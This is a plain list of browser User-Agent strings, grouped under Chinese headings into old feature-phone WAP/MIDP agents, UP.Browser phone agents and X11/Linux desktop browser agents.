		SAMSUNG-SGH-D508/1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1/*MzU1ODkzMDAwNjE5NzU4 
		SAMSUNG-SGH-D508/1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1/*MzU2MDk0MDAwNzI2Mjg0 
		SAMSUNG-SGH-D508/1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1/*MzU2MDk4MDA0Mjk2Njgx 
		SAMSUNG-SGH-E358/1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1/*MzU3Nzc2MDAwMTEyNzgz 
		SAMSUNG-SGH-E358/1.0/WAP2.0 Profile/MIDP-2.0 
		SAMSUNG-SGH-E568/TSS 2.5.0/WAP2.0 Profile/MIDP-2.0 
		SAMSUNG-SGH-E888/TSS 2.5.0/WAP2.0 Profile/MIDP-2.0 
		SAMSUNG-SGH-X478/TSS 1.0.1/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0/ 
		SAMSUNG-SGH-X488/TSS 1.0.1/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0/ 
		SAMSUNG-SGH-X648/1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1*MzU2NjkwMDAyMTg3MTkx 
		SAMSUNG-SGH-X648/1.0/WAP2.0 Profile/MIDP-2.0 
		A600 Series/MMS1.1/WAP1.2.1/TTPCom R12/Longcheer 
		CECT T868/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		CECT-E818/(2004.07.01)SW2.0.0/WAP1.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		CECT-T590/(2004.07.01)SW2.0.0/WAP1.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		CECTT586/(2004.11.30)1.0/WAP1.2.1 Profile 
		Dopod575/4.21.1088/WAP1.2 Profile/MIDP2.0 Configuration/CLDC1.0/Mozilla/4.0 (compatible; MSIE 4.01; 
		Dopod828/4.21.1088/WAP1.2 Profile/MIDP2.0 Configuration/CLDC1.0 Mozilla/4.0 (compatible; MSIE 4.01; 
		E28-MPG1/A.2.8.0.0/WAP1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		EASTCOM-ES1008/(2004.09.13)SW02/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		EASTCOM-ES1008A/(2005.03.13)SW02/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		EG908/(2004.06.30)SW4.10/WAP1.2 Profile 
		KONKA-A66/(2004.07.01)SW2.0.0/WAP1.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		LENOVO-E700/(041223)V126/WAP1.2.1 Profile 
		LENOVO-i816/(2005.07.08)Ver00.39/WAP1.2.1 
		LENOVO-P608/(2004.07.01)SW2.0.0/WAP1.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		LENOVO-P710/(20050825)V162/WAP1.2.1 Profile 
		LENOVO-V858/(050401)Ver159/WAP1.2.1 Profile 
		Mitsu-M520/(2004.11.09)VER_CH_05.20/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Mitsu-M800/(2005.02.02)VER_04.06.31/WAP1.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		NEC-N100/0100/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NEC-N109/0100/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NEC-N160/0100/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NEC-N166/(2005.2.21)0100/WAP1.2.1 Profile 
		NEC-N610/1.0/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NEC-N920/(2004.11.15)1.0/WAP1.2.1 Profile 
		NEC-N930/(2004.01.05)SW2.60/WAP1.2.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6610/(2005.01.07)SW2.0.0/WAP1.2 
		SAMSUNG-SGH-C238/RAINBOW 3.0/WAP1.2 Profile/MIDP-2.0 
		SASTA686/(2005.01.20)SW2.0.0/WAP1.2 
		SIMCOM-M1/(2005.03.30)Ver00.01/WAP1.2.1


		UP浏览器（老版手机）:

		MOT-C155 UP.Browser/6.2.2.7 (GUI) MMP/1.0 
		MOT-V171 UP.Browser/6.2.2.7 (GUI) MMP/1.0 
		MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0 
		MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0 
		Alcatel-BH4/1.0 UP.Browser/6.2.ALCATEL MMP/1.0 
		Alcatel-OT557/1.0 UP.Browser/6.2.ALCATEL MMP/1.0 
		Alcatel-TH3/1.0 UP.Browser/6.2.ALCATEL MMP/1.0 
		Alcatel-TH3/1.0 UP.Browser/6.2.ALCATEL MMP/1.0 UP.Link/6.2.3.15.0 
		Alcatel-TH4/1.0 UP.Browser/6.2.ALCATEL MMP/1.0 
		Amoi-CA6/1.0 UP.Browser/6.2.2.5 (GUI) MMP/1.0 
		Amoi-CA6/1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoisonic-A9/1.0 UP.Browser/6.2.2.6.f.1.100 (GUI) MMP/1.0 
		Amoisonic-F9/1.0 UP.Browser/6.2.2.6.f.1.100 (GUI) MMP/1.0 
		BENQ-Athena/0.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.5 (GUI) MMP/1.0 
		BenQ-M300/6.1.0.7 UP.Browser/6.1.0.7.8.c.1.100 (GUI) MMP/1.0 
		BenQ-M305/6.1.0.7 UP.Browser/6.1.0.7.8.c.1.100 (GUI) MMP/1.0 
		BenQ-M315/6.1.0.7 UP.Browser/6.1.0.7.8.c.1.103 (GUI) MMP/1.0 
		BENQ-NIKE1/CLDC_1.0 UP.Browser/6.1.0.7.7 (GUI) MMP/1.0 
		Bird-S570/6.1.0.7 UP.Browser/6.1.0.7.8.c.1.100 (GUI) MMP/1.0 
		UP.Browser/6.2.2.6.d.5.100 (GUI) MMP/1.0 
		BIRD.V59 MASV3-128x160/1.1 UP.Browser/6.1.0.6.1.c.4 (GUI) MMP/1.0 
		Capitel-C8188/1.4 CLDC/CLDC-1.0 MIDP/MIDP-1.0 UP.Browser/6.2.2.6.f.1.100 (GUI) MMP/1.0 
		Capitel-C8188/1.4 CLDC/CLDC-1.0 MIDP/MIDP-1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Capitel-F600/1.4 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Capitel-G750/1.4 CLDC/CLDC-1.0 MIDP/MIDP-1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Compal-TG762D/1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Compal-V800C/1.0 UP.Browser/6.2.2.7 (GUI) MMP/1.0 
		DNET-TGR602OJ/1.4 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.3 (GUI) MMP/1.0 
		LG-G7200 UP.Browser/6.2.2 (GUI) MMP/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Motorola-E365 UP.Browser/6.1.0.7 (GUI) MMP/1.0 
		Motorola-E365 UP.Browser/6.1.0.7.4 (GUI) MMP/1.0 
		NEC-N700/1.0 UP.Browser/6.2.2.6.e.1.101 (GUI) MMP/1.0 
		NEC-N710/1.0 UP.Browser/6.2.2.6.e.1.101 (GUI) MMP/1.0 
		NEC-N8/1.0 UP.Browser/6.1.0.5 (GUI) MMP/1.0 
		NEC-N820/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.e.1.101 (GUI) MMP/1.0 
		NEC-N830/1.0 UP.Browser/6.2.2.6.e.1.101 (GUI) MMP/1.0 
		Nokia3128/1.0 (03.15) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.5 (GUI) MMP/1.0 
		Nokia3128/1.0 (04.70) Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.5 (GUI) MMP/1.0 
		Panasonic-A200/1.0 UP.Browser/6.2.2.7 (GUI) MMP/1.0 
		Panasonic-X300/1.0 UP.Browser/6.1.0.7.4 (GUI) MMP/1.0 
		Panasonic-G50/1.0 UP.Browser/6.1.0.6.d.2.100 (GUI) MMP/1.0 
		Panasonic-G60/1.0 UP.Browser/6.1.0.6 MMP/1.0 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		Panasonic-X500/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.7 (GUI) MMP/1.0 
		UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		UP.Browser/6.1.0.7.8 (GUI) MMP/1.0 
		UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		PHILIPS568/1.0 UP.Browser/6.1.0.7.8 (GUI) MMP/1.0 
		Configuration/CLDC-1.1*MzU2NTY2MDAwMTE2Mjkz UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		Configuration/CLDC-1.1*MzU2NTY2MDAwNjA0MzE0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		Configuration/CLDC-1.1*MzU2NTY2MDAwODE1NTE0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		Configuration/CLDC-1.1*MzU2NTY2MDAxOTUxNTMy UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		Configuration/CLDC-1.1/*MzU1MDU3MDAyNDc4ODQx UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU1MDU4MDAwNTQ4Mjg4 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU1NTgxMDAwNTM0ODE4 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU1NTgxMDAxMDE3NDQx UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU2MDk0MDA4MTY5MTQ5 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU2MDk3MDA3OTMwMTE0 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU2MDk3MDA4MjAxNTA3 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU2MDk3MDAyNTgyNTg5 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU2MDk4MDA2NTUxMzQ5 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		Configuration/CLDC-1.1/*MzU3Nzc2MDAwNTY2ODMw UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 
		SAMSUNG-SGH-E100A/T2 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E330C/1.0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E630C/1.0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X460C/1.0 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E700A/BSI UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X100A/Pearl UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-S508/1.0*MzU1OTQ3MDAwODU1OTky UP.Browser/5.0.5.1 (GUI) 
		SAMSUNG-SGH-S508/1.0*MzUxOTI1MDA0NzgzNjEy UP.Browser/5.0.5.1 (GUI) 
		SAMSUNG-SGH-S508/1.0*MzUxOTI1MDA3MDYzMDUz UP.Browser/5.0.5.1 (GUI) 
		SAMSUNG-SGH-S508/1.0*MzUxOTI1MDAwNDQ0OTUz UP.Browser/5.0.5.1 (GUI) 
		SAMSUNG-SGH-E108/T2*MzUyMjkxMDAxNDM2MjQ0 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E108/T2*MzUyMjkxMDAzODk0Nzk2 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU0MzAwMDA3ODM2MjYx UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU1MjU4MDA0NTY1ODcw UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU1MjU4MDAwMDY5NjYx UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU1MjU4MDAxMDUzNTY1 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU1MjU4MDAyNTU0NzM2 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU1ODU0MDA5MjAyODA2 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E338/1.0*MzU2NTYzMDA0NDg5ODM0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E638/1.0*MzU0ODU5MDA0NjM0NjIz UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E638/1.0*MzU0ODU5MDA5MjEzMTkx UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E638/1.0*MzU1MjM4MDAxODMzNzc4 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUyMDAwMTkxMDUw UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUzMDA4NjAzOTA2 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUzMDA4ODY2NTc4 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUzMDAwNjQwNDE5 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUzMDAwNTk4Mzg1 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUzMDAwOTA2MDY3 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNTUzMDAyNDQxMDcx UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E708/1.0*MzUyNzk2MDAyMDIyMjIz UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E808/1.0*MzU0MTkzMDAwMTI1MzIz UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E808/1.0*MzU0MTkzMDAxOTM3NzE4 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E808/1.0*MzU0MTU5MDAxNDEzNjQ2 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E808/1.0*MzU0MTYwMDAwMTE1MTgy UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E808/1.0*MzU0NTU2MDAxMDAxNDMw UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E808/1.0*MzUzODAxMDAwOTM5MjI3 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X108/1.0*MzUyODA4MDAyMTczNzYz UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X108/1.0*MzUyODA4MDAyNDU0NjY4 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X108/1.0*MzUyODA4MDAzMDAxMjEx UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X108/1.0*MzUyODA4MDAzMzQwNTEw UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X108/1.0*MzUyODA4MDAzNDg1MDkx UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X468/1.0*MzU1MTc0MDA2MjQ0NDQw UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X468/1.0*MzU1MTc0MDAxNDM2NDIx UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X468/1.0*MzU1MTc0MDAxODk4MDM0 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X608/1.0*MzUyNjIzMDAwMDA1MDEw UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X608/1.0*MzUyNjIzMDAwMzQyMzQ4 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X608/1.0*MzUyNjIzMDAwNTA3NzM0 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X608/1.0*MzUyNjIzMDAxODYxMTA2 UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-X608/1.0*MzUyNjIzMDAyMTk2MTYz UP.Browser/6.1.0.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-D488/1.0*MzU1MTk4MDAwNjMzNjYy UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-D488/1.0*MzU1MTk4MDAwNzM4NDA0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-D488/1.0*MzU1MTk4MDAwOTgyMDAy UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SAMSUNG-SGH-E350/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) 
		SAMSUNG-SGH-D500C/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) 
		SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html) 
		SCH-E159 UP.Browser/6.2.3.2 (GUI) MMP/2.0 UP.Link/6.3.0.0.0 
		SEC-SGHP408*MzUyNjE5MDA0MDU3MDk4 UP.Browser/6.2.2.1 (GUI) MMP/1.0 
		SEC-SGHP518*MzUzODEwMDAwMjk1MzY1 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SEC-SGHP518*MzUzODEwMDAxMjQyMjc1 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SEC-SGHP518*MzUzODEwMDAxMzM1ODA2 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SEC-SGHP518*MzUzODEwMDAxNjAzNjE3 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SEC-SGHP518*MzUzODEwMDAxNjQyNTk5 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SEC-SGHP518*MzUzODEwMDAxNTU2MTA0 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		SHARP-TQ-GX10N/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.6.1.106 (GUI) MMP/1.0 
		SHARP-TQ-GX32/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.c.1.105 (GUI) MMP/1.0 
		SHARP-TQ-GX32/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.c.1.106 (GUI) MMP/1.0 
		SHARP-TQ-V750/1.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.6.1.d.1 (GUI) MMP/1.0 
		SIE-2128/17 UP.Browser/5.0.3.3 (GUI) 
		SIE-A65C/06 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.7.3 (GUI) MMP/1.0 
		SIE-C6C/14 UP.Browser/7.0.0.1.c.2 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-C6C/16 UP.Browser/7.0.0.1.c.3 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-C6C/25 UP.Browser/7.0.0.1.c.3 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-C6C/50 UP.Browser/7.0.2.2.d.3(GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-CF6C/09 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.7.3 (GUI) MMP/1.0 
		SIE-CX6C/14 UP.Browser/7.0.0.1.c.2 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-CX6C/25 UP.Browser/7.0.0.1.c.3 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-CX6C/43 UP.Browser/7.0.2.2.d.1.100(GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-CX6C/50 UP.Browser/7.0.2.2.d.3(GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-M6C/14 UP.Browser/7.0.0.1.c.2 (GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-M6C/43 UP.Browser/7.0.2.2.d.1.100(GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-MC6C/07 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.7.3 (GUI) MMP/1.0 
		SIE-S57C/06 UP.Browser/6.1.0.5.121 (GUI) MMP/1.0 
		SIE-S57C/14 UP.Browser/6.1.0.5.c.2 (GUI) MMP/1.0 
		SIE-S6C/50 UP.Browser/7.0.2.2.d.3(GUI) MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		SIE-SL5C/17 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.7.3 (GUI) MMP/1.0 
		SmarTone-Vodafone/SharpSX833/SHS001/1.0 Browser/UP.Browser/7.0.2.1a.556 (GUI) Profile/MIDP-2.0 
		VK-VK700 UP.Browser/6.2.3.4 (GUI) MMP/2.0 
		VK-VK810/1.1 UP.Browser/6.2.3.4 (GUI) MMP/2.0 
		VK-VK900/1.0 UP.Browser/6.2.3.4 (GUI) MMP/2.0 
		VK-VK900/1.1 UP.Browser/6.2.3.4 (GUI) MMP/2.0 
		Y600 UP.Browser/6.2.2.6 (GUI) MMP/1.0 
		YAS-COSMOS/1.0 UP.Browser/6.1.0.7.3 (GUI) MMP/1.0


		X系统（一种老版系统）:

		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15 
		Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1 
		Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1 
		Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2 
		Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5 
		Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu) 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8 
		Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3 
		Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9 
		Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8 
		Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre 
		Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 
		Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 
		Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 
		Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre 
		Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0 
		Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0 
		Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1 
		Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0 
		Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 
		Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14 
		Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5) 
		Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0 
		Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0 
		Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2 
		Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11; 
		Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1) 
		Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre 
		Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7 
		MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox) 
		Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.10.1 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5 
		Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 
		Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.56 Safari/537.4 
		Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5 (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher 
		Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0 
		Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 
		Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1 
